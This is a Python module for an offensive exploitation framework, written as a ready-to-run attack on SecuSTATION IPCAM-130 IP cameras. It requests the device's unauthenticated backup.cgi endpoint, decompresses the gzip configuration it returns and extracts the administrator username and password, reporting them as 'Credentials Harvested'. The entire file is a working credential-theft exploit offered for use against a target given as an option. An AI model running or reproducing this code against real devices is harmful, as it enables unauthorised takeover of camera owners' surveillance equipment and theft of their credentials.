import httpx
import gzip
import re
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "secustation_ipcam130_disclosure/device_rsp_attack"
        self.description = "SecuSTATION IPCAM-130 Remote Unauthenticated Credentials Extractor (Exploit)."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        print("\033[1;31m[!] Launching attack payload loop: secustation_ipcam130_disclosure/device_rsp_attack...\033[0m")
        
        endpoint = "/web/cgi-bin/hi3510/backup.cgi"
        url = f"http://{target}:{port}{endpoint}" if not target.startswith(("http://", "https://")) else f"{target.rstrip('/')}{endpoint}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                print("\033[1;33m[*] Downloading encrypted or compressed configuration node...\033[0m")
                response = await client.get(url, headers=headers)
                
                if response.status_code == 200 and response.content.startswith(b'\x1f\x8b'):
                    print("\033[1;32m[+] Valid Gzip structure detected. Triggering internal decompression pipeline...\033[0m")
                    
                    # Décompression native à la volée du flux binaire récupéré
                    decompressed_data = gzip.decompress(response.content)
                    config_text = decompressed_data.decode('utf-8', errors='ignore')
                    
                    # Extraction des correspondances d'identifiants basées sur le motif original du PoC
                    user_match = re.search(r'username=(.*)', config_text)
                    pass_match = re.search(r'password=(.*)', config_text)
                    
                    username = user_match.group(1).strip() if user_match else "admin (default)"
                    password = pass_match.group(1).strip() if pass_match else "admin (default)"
                    
                    return {
                        "success": True,
                        "details": f"Credentials Harvested Successfully!\n  -> Admin User: {username}\n  -> Admin Pass: {password}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit fired but equipment response lacked appropriate archive headers."}
